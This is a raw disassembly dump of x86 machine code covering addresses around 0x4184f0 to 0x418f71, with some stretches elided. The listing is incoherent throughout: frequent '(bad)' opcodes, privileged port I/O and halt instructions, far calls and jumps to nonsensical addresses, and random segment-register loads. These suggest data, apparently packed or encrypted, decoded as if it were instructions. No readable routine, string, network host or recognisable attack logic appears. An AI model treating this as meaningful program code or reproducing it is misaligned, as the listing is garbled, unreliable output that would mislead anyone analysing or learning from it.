  4184f0:	jmp    0x3cdb:0x9b61e0b
  4184f7:	sbb    ebp,eax
  4184f9:	and    al,0xd
  4184fb:	and    esi,DWORD PTR [ecx-0x28e4bd5e]
  418501:	data16 (bad) 
  418503:	fcom   DWORD PTR [ebp-0x75be6320]
  418509:	sbb    DWORD PTR [ebx+0x45],edx
  41850c:	ja     0x41857a
  41850e:	cmp    dl,dl
	...
  418574:	inc    ecx
  418575:	stc    
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	cmp    DWORD PTR [eax],esp
  418582:	mov    bh,0xe4
  418584:	cwde   
  418585:	add    DWORD PTR [ecx],eax
  418587:	add    BYTE PTR [ecx+eax*1],al
  41858a:	add    BYTE PTR [eax],al
  41858c:	repz call 0x87719dd2
  418592:	mov    ebx,0x937d6a
  418597:	xchg   edi,eax
  418598:	push   esi
  418599:	mov    ch,0xf3
  41859b:	jne    0x41855d
  41859d:	xor    ch,0x29
  4185a0:	cwde   
  4185a1:	mov    bl,0x5
  4185a3:	cmp    al,0xf6
  4185a5:	pop    ds
  4185a6:	mov    ds,WORD PTR [eax-0x35]
  4185a9:	jne    0x418600
  4185ab:	rol    BYTE PTR [esi+0x64],0xb6
  4185af:	xchg   BYTE PTR [edi+0x32b3e972],bl
  4185b5:	mov    eax,0xcecb157c
  4185ba:	bound  ebx,QWORD PTR [esi-0x69]
  4185bd:	push   edi
  4185be:	clc    
  4185bf:	fwait
  4185c0:	sbb    ah,BYTE PTR [eax+0x4c]
  4185c3:	xor    eax,edx
  4185c5:	jmp    0x87493d43
  4185ca:	mov    eax,ds:0x7114a163
  4185cf:	setge  BYTE PTR [ebx-0x57b97da]
  4185d6:	xor    DWORD PTR [eax-0x277ca743],esp
  4185dc:	push   edx
  4185dd:	inc    BYTE PTR ds:0x9026e229
  4185e3:	push   cs
  4185e4:	retf   
  4185e5:	jae    0x4185c4
  4185e7:	xlat   BYTE PTR ds:[ebx]
  4185e8:	cdq    
  4185e9:	push   edi
  4185ea:	aaa    
  4185eb:	out    0x9c,al
  4185ed:	adc    DWORD PTR [edi],edi
  4185ef:	test   al,0xb1
  4185f1:	adc    ebx,DWORD PTR [ebp+eiz*2-0x2a]
  4185f5:	hlt    
  4185f6:	push   cs
  4185f7:	test   BYTE PTR [esi+ebp*4],ah
  4185fa:	repnz pop edi
  4185fc:	sahf   
  4185fd:	mov    esi,0xdcca118a
  418602:	test   BYTE PTR [eax],0x26
  418605:	or     eax,DWORD PTR [ebx]
  418607:	pop    es
  418608:	imul   ebp,edi,0xc95a5c29
  41860e:	mov    bh,bl
  418610:	mov    ecx,DWORD PTR [ecx]
  418612:	cmc    
  418613:	enter  0x18a4,0x28
  418617:	adc    ebp,ebx
  418619:	ror    DWORD PTR [ecx-0xecebfbf],0x59
  418620:	or     al,0xf0
  418622:	adc    cl,BYTE PTR [edx+ebx*4]
  418625:	hlt    
  418626:	out    dx,eax
  418627:	call   0xcdc3095e
  41862c:	jns    0x4185bf
  41862e:	std    
  41862f:	cmp    esi,DWORD PTR [ebx-0x25]
  418632:	xchg   edi,eax
  418633:	adc    BYTE PTR [eax-0x762e4fa3],0xa8
  41863a:	mov    edx,0xfcbdc54e
  41863f:	fild   WORD PTR [eax-0x72]
  418642:	loop   0x418643
  418644:	mov    edx,0xe80a2c0b
  418649:	ds retf 
  41864b:	shr    BYTE PTR [ebx],0x2b
  41864e:	pop    eax
  41864f:	stos   DWORD PTR es:[edi],eax
  418650:	or     DWORD PTR [edx-0x4e],esp
  418653:	js     0x41866d
  418655:	outs   dx,DWORD PTR ds:[esi]
  418656:	mov    dl,0xe9
  418658:	in     eax,0xd0
  41865a:	add    dl,BYTE PTR [ebp+0x36]
  41865d:	inc    ebx
  41865e:	sub    al,0x1b
  418660:	sbb    al,0xc4
  418662:	ret    0x461a
  418665:	addr16 and edx,ebx
  418668:	fst    DWORD PTR [eax-0x6d]
  41866b:	(bad)  
  41866d:	xor    al,0x81
  41866f:	pop    esp
  418670:	pop    es
  418671:	ror    dl,1
  418673:	pop    ebx
  418674:	mov    ah,0x1f
  418676:	jns    0x418603
  418678:	out    0xa8,al
  41867a:	out    0x47,eax
  41867c:	sbb    ecx,DWORD PTR [ebx+0x12115b07]
  418682:	mov    DWORD PTR [eax-0x1fb5db],edx
  418688:	scas   eax,DWORD PTR es:[edi]
  418689:	jne    0x418640
  41868b:	aas    
  41868c:	test   BYTE PTR [ebp+0x45],ch
  41868f:	pop    edi
	...
  4186f4:	xchg   ebx,eax
  4186f5:	sub    BYTE PTR [eax-0x604344c4],ah
  4186fb:	scas   eax,DWORD PTR es:[edi]
  4186fc:	or     al,0x8d
  4186fe:	cmp    edx,edx
  418700:	mul    ebx
  418702:	pop    esp
  418703:	aad    0x9c
  418705:	add    al,BYTE PTR [ecx]
  418707:	add    BYTE PTR [ecx+eax*1],al
  41870a:	add    BYTE PTR [eax],al
  41870c:	sub    eax,0x161594e8
  418711:	leave  
  418712:	ret    
  418713:	test   BYTE PTR [edi+0x358fd265],al
  418719:	jp     0x4186a7
  41871b:	in     eax,0xba
  41871d:	pop    esp
  41871e:	jecxz  0x41876c
  418720:	mov    ebx,0x23be6b3d
  418725:	(bad)  
  418726:	cmc    
  418727:	imul   esi,DWORD PTR [eax+0x66b1264],0x7
  41872e:	push   cs
  41872f:	(bad)  
  418730:	dec    esp
  418731:	mov    cl,0xb5
  418733:	pop    edi
  418734:	inc    esi
  418735:	outs   dx,BYTE PTR ds:[esi]
  418736:	xchg   edx,eax
  418737:	pop    esi
  418738:	xor    ebx,esi
  41873a:	jle    0x4186f7
  41873c:	and    BYTE PTR [edx+ecx*2-0x4a],0xe0
  418741:	add    eax,0xce4c473b
  418746:	inc    edi
  418747:	imul   ecx,ebp,0x4d
  41874a:	adc    bl,dh
  41874c:	xchg   ebx,eax
  41874d:	or     DWORD PTR ds:[ebp+0x6a],ebx
  418751:	or     ch,bh
  418753:	outs   dx,BYTE PTR ds:[esi]
  418754:	(bad)  
  418755:	jnp    0x4186e7
  418757:	ret    
  418758:	popf   
  418759:	jmp    0x4187b8
  41875b:	sub    eax,0x95f0011f
  418760:	js     0x4187ac
  418762:	cmp    edx,DWORD PTR [ecx+0x5d30cd16]
  418768:	shl    DWORD PTR [edi+esi*2],0x80
  41876c:	jp     0x4186f3
  41876e:	les    ecx,FWORD PTR [ebx+ebx*2+0x6e79c537]
  418775:	mov    edi,0x9f695db4
  41877a:	xchg   ebp,eax
  41877b:	xor    BYTE PTR [ebp+eax*2-0x6778b2db],ch
  418782:	cwde   
  418783:	sub    DWORD PTR [ecx+ebp*8-0x78bf2e36],ebp
  41878a:	add    BYTE PTR [eax-0x77],dh
  41878d:	stc    
  41878e:	or     eax,0x244c5eb4
  418793:	xchg   bl,ah
  418795:	add    DWORD PTR [ebx],eax
  418797:	mov    al,ds:0x2c43848f
  41879c:	aam    0xc2
  41879e:	sub    al,ch
  4187a0:	(bad)  
  4187a1:	fcmovnbe st,st(2)
  4187a3:	jle    0x418725
  4187a5:	retf   0xf36f
  4187a8:	jle    0x4187d7
  4187aa:	pusha  
  4187ab:	xor    DWORD PTR [ebx+0x7a],edi
  4187ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187af:	fldenv [edx-0x66]
  4187b2:	or     eax,0xc3420efc
  4187b7:	xchg   esi,eax
  4187b8:	xchg   DWORD PTR [ebp-0x4470559e],esp
  4187be:	mov    edx,DWORD PTR [esi+0x79436b64]
  4187c4:	mov    al,ds:0xa28cab6d
  4187c9:	sti    
  4187ca:	rcl    DWORD PTR [ecx-0x70],1
  4187cd:	jmp    0x21df6f0e
  4187d2:	sub    eax,0xd2220e6
  4187d7:	pop    ebp
  4187d8:	pop    esp
  4187d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187da:	in     eax,0x4f
  4187dc:	mov    dl,0xd6
  4187de:	test   DWORD PTR [ebp-0x50],ecx
  4187e1:	add    DWORD PTR [edi],ebp
  4187e3:	and    ebp,DWORD PTR [esi+0x10466bd4]
  4187e9:	sub    al,0x68
  4187eb:	bound  ecx,QWORD PTR ss:[ebp+0x3b9cb99]
  4187f2:	fsubr  QWORD PTR [edi]
  4187f4:	es es adc al,0x79
  4187f8:	stos   BYTE PTR es:[edi],al
  4187f9:	or     al,0x3b
  4187fb:	cmp    eax,0xf5f8e1b0
  418800:	and    ecx,ebx
  418802:	test   esp,edx
  418804:	dec    esi
  418805:	fwait
  418806:	mov    esp,0x714c339
  41880b:	int    0x27
  41880d:	xor    ah,BYTE PTR [edx+esi*2+0x0]
	...
  418871:	add    BYTE PTR [eax],al
  418873:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  41887a:	hlt    
  41887b:	fbld   TBYTE PTR [esi-0x2c63c533]
  418881:	push   edx
  418882:	hlt    
  418883:	or     BYTE PTR [eax+0x4000103],ah
  418889:	add    DWORD PTR [eax],eax
  41888b:	add    BYTE PTR ds:0x22c677ab,dh
  418891:	pushf  
  418892:	(bad)  
  418893:	mov    edx,0xc053430a
  418898:	(bad)  
  41889a:	and    al,al
  41889c:	stos   DWORD PTR es:[edi],eax
  41889d:	lock in eax,dx
  41889f:	inc    edi
  4188a0:	das    
  4188a1:	test   cl,0x73
  4188a4:	bound  ebp,QWORD PTR [eax-0x538ec957]
  4188aa:	and    dh,BYTE PTR [edi+0x35]
  4188ad:	push   es
  4188ae:	or     eax,0x152d0e62
  4188b3:	push   0x75e58295
  4188b8:	push   0x54a2fb0e
  4188bd:	sbb    BYTE PTR [edx+eax*4-0x18],bl
  4188c1:	mov    al,ds:0xe526ae9c
  4188c6:	add    al,0xf0
  4188c8:	pop    eax
  4188c9:	fdiv   DWORD PTR [edx]
  4188cb:	stos   DWORD PTR es:[edi],eax
  4188cc:	mov    ebx,0xe609afe2
  4188d1:	sbb    BYTE PTR [eax+ebp*8-0x49220cca],dl
  4188d8:	jmp    0x4188fd
  4188da:	in     eax,dx
  4188db:	stc    
  4188dc:	repz mov ebx,0x98003234
  4188e2:	in     eax,0x93
  4188e4:	data16 scas al,BYTE PTR es:[edi]
  4188e6:	(bad)  [edi+edi*1+0x8]
  4188ea:	stos   DWORD PTR es:[edi],eax
  4188eb:	adc    ebx,DWORD PTR [ebx]
  4188ed:	out    0xf2,al
  4188ef:	rcl    ch,cl
  4188f1:	jmp    0xe689f4ee
  4188f6:	lds    esp,FWORD PTR [esi+0x3671a219]
  4188fc:	ret    
  4188fd:	ror    DWORD PTR [edi-0x2f4b03e9],cl
  418903:	jb     0x418950
  418905:	pop    ss
  418906:	mov    ds:0xa4501fcc,al
  41890b:	mov    eax,0x4d2cc01c
  418910:	jg     0x4188d3
  418912:	sub    esi,DWORD PTR [esi-0x92c4375]
  418918:	mov    dl,0xc5
  41891a:	dec    ebx
  41891b:	jno    0x418947
  41891d:	das    
  41891e:	jmp    0x41898c
  418920:	lahf   
  418921:	pushf  
  418922:	aaa    
  418923:	retf   
  418924:	jnp    0x41898d
  418926:	leave  
  418927:	inc    esp
  418928:	jecxz  0x418963
  41892a:	xchg   ah,ch
  41892c:	mov    bh,0x36
  41892e:	sar    BYTE PTR [ecx-0x227bc4f7],1
  418934:	lods   al,BYTE PTR ds:[esi]
  418935:	lock neg BYTE PTR [eax-0x5372eacc]
  41893c:	xor    eax,DWORD PTR [eax+0x6936dfe3]
  418942:	mov    ch,BYTE PTR [ecx-0x34828158]
  418948:	mov    ch,BYTE PTR [eax]
  41894a:	jmp    0x41896f
  41894c:	scas   al,BYTE PTR es:[edi]
  41894d:	mov    eax,0x50fe6b5f
  418952:	test   BYTE PTR [esi+ecx*1-0x70],al
  418956:	bound  esi,QWORD PTR [esi]
  418958:	loopne 0x418929
  41895a:	mov    cl,0xa6
  41895c:	dec    edx
  41895d:	mov    cl,0x95
  41895f:	and    ah,BYTE PTR [ebx+esi*4-0xa]
  418963:	rcl    dh,cl
  418965:	loope  0x41890b
  418967:	add    edx,ebx
  418969:	pusha  
  41896a:	and    al,dh
  41896c:	enter  0x257b,0xa6
  418970:	or     edx,DWORD PTR [edx-0x399073b1]
  418976:	std    
  418977:	or     al,0xa1
  418979:	icebp  
  41897a:	push   eax
  41897b:	fild   WORD PTR [edi+eiz*2-0x33]
  41897f:	int    0xd5
  418981:	fild   DWORD PTR [esi+0x2d]
  418984:	push   ebp
  418985:	dec    eax
  418986:	dec    edx
  418987:	jo     0x418961
  418989:	inc    ecx
  41898a:	fdiv   st,st(1)
  41898c:	lds    esp,FWORD PTR [ebx]
  41898e:	cli    
  41898f:	pop    edx
	...
  4189f4:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0x8da22869
  418a03:	adc    eax,0x104a4
  418a08:	add    al,0x1
  418a0a:	add    BYTE PTR [eax],al
  418a0c:	jmp    0x418a5d
  418a0e:	xor    eax,0x2a3fbc24
  418a13:	sub    esi,ecx
  418a15:	cmp    BYTE PTR [ecx],bh
  418a17:	call   0x8e88d89f
  418a1c:	dec    ebp
  418a1d:	(bad)  
  418a1e:	mov    esi,0x1eb95e78
  418a23:	js     0x418a28
  418a25:	and    ch,BYTE PTR [edx+0x15]
  418a28:	jb     0x4189ca
  418a2a:	pop    esi
  418a2b:	sahf   
  418a2c:	retf   
  418a2d:	imul   eax,ecx,0xffffffc0
  418a30:	out    0xcf,al
  418a32:	popf   
  418a33:	js     0x418a70
  418a35:	mov    edi,ss
  418a37:	in     eax,dx
  418a38:	lock cmp al,0xb3
  418a3b:	loope  0x418a0f
  418a3d:	mov    al,ds:0x3b93c088
  418a42:	adc    ebp,DWORD PTR [ebx]
  418a44:	add    ebp,edi
  418a46:	sub    DWORD PTR [edx+edi*1-0x3fad2f2f],0x391a80bd
  418a51:	mov    eax,0x32be2ec4
  418a56:	and    bl,BYTE PTR [eax-0x46]
  418a59:	dec    eax
  418a5a:	add    DWORD PTR gs:[ecx+eax*2+0x48],ebp
  418a5f:	pop    ss
  418a60:	or     DWORD PTR [ecx-0x7],ecx
  418a63:	pop    eax
  418a64:	pop    edi
  418a65:	stos   DWORD PTR es:[edi],eax
  418a66:	cmp    BYTE PTR gs:[ecx+0x7e55660d],dl
  418a6d:	dec    ecx
  418a6e:	push   ebx
  418a6f:	in     eax,dx
  418a70:	pushf  
  418a71:	sar    DWORD PTR [eax+0x18558b05],1
  418a77:	(bad)  
  418a78:	stc    
  418a79:	(bad)  
  418a7a:	stos   BYTE PTR es:[edi],al
  418a7b:	jb     0x418aad
  418a7d:	xor    DWORD PTR [ebx],edi
  418a7f:	jnp    0x418a1a
  418a81:	addr16 lahf 
  418a83:	xchg   esp,eax
  418a84:	or     ebx,DWORD PTR [edx-0x35c62d45]
  418a8a:	mov    dh,BYTE PTR [esi-0x75a2eb6]
  418a90:	or     DWORD PTR [ecx],edi
  418a92:	mov    bl,0x80
  418a94:	inc    esi
  418a95:	pusha  
  418a96:	imul   esp,esi,0x7f
  418a99:	rcr    BYTE PTR [esi-0x35],0x1f
  418a9d:	push   es
  418a9e:	shr    BYTE PTR [ebx-0x4c5e5084],0xa5
  418aa5:	mov    WORD PTR [ebx],fs
  418aa7:	std    
  418aa8:	and    DWORD PTR [ecx],ebp
  418aaa:	jbe    0x418ab5
  418aac:	outs   dx,DWORD PTR ds:[esi]
  418aad:	mov    dl,BYTE PTR [edi+edx*1+0x3dafd220]
  418ab4:	out    0xc8,al
  418ab6:	pop    esp
  418ab7:	call   esi
  418ab9:	jae    0x418aa2
  418abb:	test   al,0x9b
  418abd:	mov    ch,0xcd
  418abf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ac0:	std    
  418ac1:	dec    edx
  418ac2:	test   BYTE PTR [esi+0x3c8caf3e],0x11
  418ac9:	les    edi,FWORD PTR [esi]
  418acb:	test   DWORD PTR [ebp-0x11],0x68de90da
  418ad2:	pop    es
  418ad3:	aaa    
  418ad4:	push   ecx
  418ad5:	mov    ds:0x2dbba63e,eax
  418ada:	div    BYTE PTR [edx]
  418adc:	mov    ch,0x8f
  418ade:	adc    bh,BYTE PTR [eax+0x13]
  418ae1:	pop    ebx
  418ae2:	aad    0x67
  418ae4:	jns    0x418af2
  418ae6:	je     0x418abe
  418ae8:	je     0x418aa1
  418aea:	xchg   ecx,eax
  418aeb:	(bad)  
  418aec:	lock sbb bh,BYTE PTR [edx-0x744e10af]
  418af3:	inc    eax
  418af4:	mov    edi,0xcc67befa
  418af9:	push   0xe
  418afb:	daa    
  418afc:	jge    0x418ad9
  418afe:	or     eax,0x70b6450b
  418b03:	mov    al,ds:0x647ceea1
  418b08:	xchg   ebp,esi
  418b0a:	cdq    
  418b0b:	fisub  WORD PTR [edi]
  418b0d:	cli    
  418b0e:	shl    ch,cl
	...
  418b74:	jl     0x418b89
  418b76:	test   DWORD PTR [edx],esi
  418b78:	out    dx,eax
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0x43
  418b81:	cmp    DWORD PTR ds:0x105a857,0x10400
  418b8b:	add    BYTE PTR [eax-0x69],cl
  418b8e:	aam    0xcc
  418b90:	mov    esp,0xd516aaef
  418b95:	sahf   
  418b96:	mov    ebp,0xc18c5f04
  418b9b:	leave  
  418b9c:	repnz xchg ebx,eax
  418b9e:	out    dx,al
  418b9f:	jne    0x418bdb
  418ba1:	ins    DWORD PTR es:[edi],dx
  418ba2:	inc    ebp
  418ba3:	(bad)  
  418ba4:	fbstp  TBYTE PTR [edx]
  418ba6:	pop    ebx
  418ba7:	pushf  
  418ba8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ba9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418baa:	rcr    BYTE PTR [ecx+edi*2],cl
  418bad:	popf   
  418bae:	in     eax,0xf3
  418bb0:	ja     0x418bb7
  418bb2:	adc    eax,esi
  418bb4:	and    esp,ebx
  418bb6:	mov    BYTE PTR [ecx+0x65],ah
  418bb9:	xchg   edx,eax
  418bba:	imul   ecx,DWORD PTR [ecx+ebx*2],0x27562673
  418bc1:	mov    esi,0xcb39528e
  418bc6:	xor    ch,BYTE PTR ds:0xf375e604
  418bcc:	and    al,0x29
  418bce:	dec    eax
  418bcf:	aam    0xa5
  418bd1:	sbb    eax,0x6c8decc2
  418bd6:	int    0x6b
  418bd8:	neg    BYTE PTR [ebx+0x76160c70]
  418bde:	lods   eax,DWORD PTR ds:[esi]
  418bdf:	std    
  418be0:	sub    al,0x9a
  418be2:	or     DWORD PTR [ecx+0x43b244ac],ebp
  418be8:	xchg   edx,eax
  418be9:	add    bh,BYTE PTR [ebx]
  418beb:	in     al,dx
  418bec:	in     eax,dx
  418bed:	retf   0x58cb
  418bf0:	addr16 xchg esi,eax
  418bf2:	xchg   esp,eax
  418bf3:	add    BYTE PTR [esi+0x2af47d76],cl
  418bf9:	and    al,0x49
  418bfb:	mov    bh,0x8e
  418bfd:	pop    esi
  418bfe:	mov    ?,WORD PTR [edi+0xd9b46dc]
  418c04:	xor    BYTE PTR [edi],al
  418c06:	xchg   al,dl
  418c08:	outs   dx,DWORD PTR ds:[esi]
  418c09:	jecxz  0x418bb3
  418c0b:	xchg   ebp,eax
  418c0c:	das    
  418c0d:	pop    ebp
  418c0e:	es in  al,dx
  418c10:	add    DWORD PTR [edx],0x962e18ea
  418c16:	call   0x2795:0x5d5bc584
  418c1d:	fdiv   QWORD PTR [edi]
  418c1f:	cli    
  418c20:	xchg   esp,eax
  418c21:	call   0xc195ac6b
  418c26:	in     al,0x11
  418c28:	pop    esi
  418c29:	adc    ebx,edi
  418c2b:	fnstsw WORD PTR [edi+eiz*4-0x22]
  418c2f:	mov    DWORD PTR [esi+eiz*4-0x14],ecx
  418c33:	jecxz  0x418be2
  418c35:	inc    edi
  418c36:	outs   dx,BYTE PTR ds:[esi]
  418c37:	jge    0x418c6b
  418c39:	adc    al,0x64
  418c3b:	scas   eax,DWORD PTR es:[edi]
  418c3c:	xchg   esp,eax
  418c3d:	stc    
  418c3e:	dec    edx
  418c3f:	dec    ebx
  418c40:	icebp  
  418c41:	cwde   
  418c42:	aaa    
  418c43:	mov    dl,0x86
  418c45:	xchg   esi,eax
  418c46:	clc    
  418c47:	mov    al,ds:0x5b64690d
  418c4c:	pop    es
  418c4d:	mov    ch,0xb9
  418c4f:	inc    edx
  418c50:	fnstenv [ebp-0x22f82ff5]
  418c56:	pop    eax
  418c57:	dec    esi
  418c58:	leave  
  418c59:	sbb    eax,0xf1235355
  418c5e:	pop    es
  418c5f:	jo     0x418c13
  418c61:	shl    BYTE PTR [eax+edx*4+0x48],cl
  418c65:	and    esi,ebp
  418c67:	inc    edi
  418c68:	add    bh,BYTE PTR [edx]
  418c6a:	push   edi
  418c6b:	xchg   DWORD PTR [ebx+ebp*2-0x30c5d77b],esp
  418c72:	sbb    BYTE PTR [edi-0x49cb30fe],al
  418c78:	push   esi
  418c79:	repnz out dx,al
  418c7b:	or     eax,0x6d3e5745
  418c80:	jno    0x418cfb
  418c82:	mov    cl,0xed
  418c84:	and    eax,0x7ef92f3
  418c89:	test   al,0x2f
  418c8b:	ret    
  418c8c:	jge    0x418cc8
  418c8e:	add    al,0x5f
	...
  418cf4:	sti    
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	ror    BYTE PTR [edi-0x6b],cl
  418d02:	or     eax,0x106ac22
  418d07:	add    BYTE PTR [ecx+eax*1],al
  418d0a:	add    BYTE PTR [eax],al
  418d0c:	int3   
  418d0d:	pop    ecx
  418d0e:	lds    edi,FWORD PTR [ebp-0x5a161b64]
  418d14:	xor    esp,edi
  418d16:	and    DWORD PTR [ebp-0x68],ebp
  418d19:	jae    0x418d70
  418d1b:	cmp    eax,0xea374e31
  418d20:	nop
  418d21:	sbb    ecx,DWORD PTR [edx-0x4b68895a]
  418d27:	mov    DWORD PTR [ebp+0x386f4543],0x7d24999e
  418d31:	clc    
  418d32:	sub    ch,BYTE PTR [eax+0x4d]
  418d35:	stos   BYTE PTR es:[edi],al
  418d36:	sbb    DWORD PTR [esi],0xffffffd4
  418d39:	add    DWORD PTR [ecx+esi*4-0x16],esi
  418d3d:	in     al,0xaa
  418d3f:	(bad)  
  418d40:	lea    ebp,[eax+eax*4]
  418d43:	mov    esi,0x3ed6282c
  418d48:	outs   dx,BYTE PTR ds:[esi]
  418d49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d4a:	xor    esi,0xffffff95
  418d4d:	sbb    al,0x79
  418d4f:	pop    esi
  418d50:	lods   al,BYTE PTR ds:[esi]
  418d51:	and    ebp,esp
  418d53:	sbb    BYTE PTR [ecx*2+0x2e62e600],al
  418d5a:	stc    
  418d5b:	and    esp,0x5748b5a9
  418d61:	jae    0x418d12
  418d63:	call   0x45af:0x835009eb
  418d6a:	mov    bh,0x82
  418d6c:	loopne 0x418d4b
  418d6e:	(bad)  
  418d6f:	and    dh,BYTE PTR [eax+0x13]
  418d72:	xchg   esi,eax
  418d73:	jne    0x418db7
  418d75:	mov    ebp,0x6e3a1932
  418d7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d7b:	jne    0x418d5b
  418d7d:	repz push esi
  418d7f:	mov    dh,BYTE PTR [ecx+esi*1-0x2ec3a54]
  418d86:	pop    eax
  418d87:	cs (bad) 
  418d89:	mov    ?,WORD PTR [edx-0x5ee7e10e]
  418d8f:	pop    esi
  418d90:	and    BYTE PTR [ecx],ah
  418d92:	fld    QWORD PTR [ebx+0x3be74d08]
  418d98:	sti    
  418d99:	cmp    DWORD PTR [esp+eiz*4],0xdf4ced17
  418da0:	loop   0x418d99
  418da2:	add    BYTE PTR [esi],ah
  418da4:	in     eax,dx
  418da5:	(bad)  
  418da6:	xor    edx,DWORD PTR [ebx+0x76]
  418da9:	mov    dl,0x33
  418dab:	sub    esi,edx
  418dad:	nop
  418dae:	aas    
  418daf:	out    dx,eax
  418db0:	jne    0x418dee
  418db2:	jo     0x418da5
  418db4:	xchg   DWORD PTR [edx-0x1f],esi
  418db7:	(bad)  
  418db9:	shr    BYTE PTR [ecx],1
  418dbb:	mov    ebx,0x8ed82db2
  418dc0:	fimul  DWORD PTR [esi+ebx*8-0x637ab03d]
  418dc7:	call   0x7571:0x2c8a491
  418dce:	nop
  418dcf:	mov    dl,0x7d
  418dd1:	mov    cs,WORD PTR [ecx+eax*2-0x7fcd0688]
  418dd8:	repz fs jne 0x418e4d
  418ddc:	call   0x7fdb9161
  418de1:	(bad)  
  418de2:	cwde   
  418de3:	lods   al,BYTE PTR ds:[esi]
  418de4:	push   esi
  418de5:	fxtract 
  418de7:	sub    eax,0xfe7ba7f7
  418dec:	mov    ah,0x13
  418dee:	sub    eax,0x326c0f76
  418df3:	jle    0x418e41
  418df5:	adc    BYTE PTR [edx+0x5ff444d6],ch
  418dfb:	(bad)  
  418dfc:	loopne 0x418e26
  418dfe:	in     al,0xda
  418e00:	add    BYTE PTR [ecx-0x76062cfc],dl
  418e06:	jnp    0x418e6f
  418e08:	sub    dl,0x6e
  418e0b:	ret    0xe5b7
  418e0e:	xor    BYTE PTR [eax+0x0],0x0
	...
  418e71:	add    BYTE PTR [eax],al
  418e73:	add    BYTE PTR [esi],cl
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx+0x3a]
  418e81:	sub    eax,DWORD PTR ds:0x107b0b6
  418e87:	add    BYTE PTR [ecx+eax*1],al
  418e8a:	add    BYTE PTR [eax],al
  418e8c:	mov    al,0x32
  418e8e:	xchg   ebp,eax
  418e8f:	aad    0x41
  418e91:	fwait
  418e92:	daa    
  418e93:	add    eax,0xe5680282
  418e98:	loope  0x418e46
  418e9a:	fdiv   st,st(0)
  418e9c:	jne    0x418e25
  418e9e:	push   eax
  418e9f:	push   DWORD PTR [ecx+0x7d257d1e]
  418ea5:	es pop ds
  418ea7:	pop    ds
  418ea8:	je     0x418f03
  418eaa:	mov    bh,0xcd
  418eac:	or     al,0xd8
  418eae:	jmp    0x87b990f2
  418eb3:	and    BYTE PTR [ebx],al
  418eb5:	rcl    BYTE PTR [ebp-0x7977b336],0xea
  418ebc:	dec    ebp
  418ebd:	lods   al,BYTE PTR ds:[esi]
  418ebe:	fdiv   DWORD PTR [edi+ebp*1+0x6c2af0e4]
  418ec5:	ficom  DWORD PTR [edi+0x17979b99]
  418ecb:	out    dx,eax
  418ecc:	pop    eax
  418ecd:	inc    eax
  418ece:	inc    ebp
  418ecf:	adc    eax,0xaf98df60
  418ed4:	outs   dx,BYTE PTR ds:[esi]
  418ed5:	fisttp DWORD PTR [edx-0x55eb96fd]
  418edb:	fadd   DWORD PTR [esi-0x22]
  418ede:	cli    
  418edf:	dec    esp
  418ee0:	ins    DWORD PTR es:[edi],dx
  418ee1:	jns    0x418eb7
  418ee3:	rcl    BYTE PTR [esi+0x67],cl
  418ee6:	fwait
  418ee7:	cmp    BYTE PTR [ebp-0x1b],ch
  418eea:	lea    esi,[esi]
  418eec:	or     ah,dh
  418eee:	fxch   st(2)
  418ef0:	push   0xd9aa8732
  418ef5:	call   DWORD PTR [ebx*4+0x272ccd70]
  418efc:	xchg   edx,eax
  418efd:	call   0xae24:0xa8ff6653
  418f04:	mov    BYTE PTR [ecx-0x1c],bl
  418f07:	inc    esi
  418f08:	xchg   DWORD PTR [esi-0x3ad527a4],edi
  418f0e:	inc    edi
  418f0f:	jne    0x418f45
  418f11:	mov    ch,0x5d
  418f13:	pop    esi
  418f14:	xchg   edi,eax
  418f15:	push   ss
  418f16:	xchg   BYTE PTR [ebx+0x4d],ch
  418f19:	xor    al,0xf
  418f1b:	iret   
  418f1c:	outs   dx,BYTE PTR ds:[esi]
  418f1d:	mov    WORD PTR [edx+0x64],gs
  418f20:	je     0x418f83
  418f22:	pop    ebx
  418f23:	aas    
  418f24:	push   cs
  418f25:	lahf   
  418f26:	(bad)  
  418f27:	cdq    
  418f28:	xchg   edi,eax
  418f29:	mov    edi,0xbac46f43
  418f2e:	pop    ecx
  418f2f:	pop    esi
  418f30:	mov    ds,WORD PTR [ebx+0x61]
  418f33:	jno    0x418eb6
  418f35:	inc    ebx
  418f36:	sub    al,ch
  418f38:	xlat   BYTE PTR ds:[ebx]
  418f39:	loope  0x418f32
  418f3b:	cmp    dh,ah
  418f3d:	rcr    BYTE PTR ss:[ecx],1
  418f40:	(bad)  
  418f41:	(bad)  
  418f43:	fstp   TBYTE PTR [eax-0x6240d389]
  418f49:	push   ecx
  418f4a:	(bad)  
  418f4b:	fst    DWORD PTR [edx]
  418f4d:	js     0x418f81
  418f4f:	pop    ss
  418f50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f51:	mov    esp,edx
  418f53:	pop    eax
  418f54:	into   
  418f55:	push   ebx
  418f56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f57:	jle    0x418f96
  418f59:	mov    bh,0xa8
  418f5b:	fild   DWORD PTR [ebx+0x48]
  418f5e:	push   es
  418f5f:	mov    dh,0xd
  418f61:	sar    BYTE PTR [edi],1
  418f63:	mov    eax,0x76dcb18f
  418f68:	sub    al,0x51
  418f6a:	add    DWORD PTR [ebx],eax
  418f6c:	in     al,0xd1
  418f6e:	scas   al,BYTE PTR es:[edi]
  418f6f:	push   ebx
  418f70:	push   ds
  418f71:	mov    esp,0x594ad412
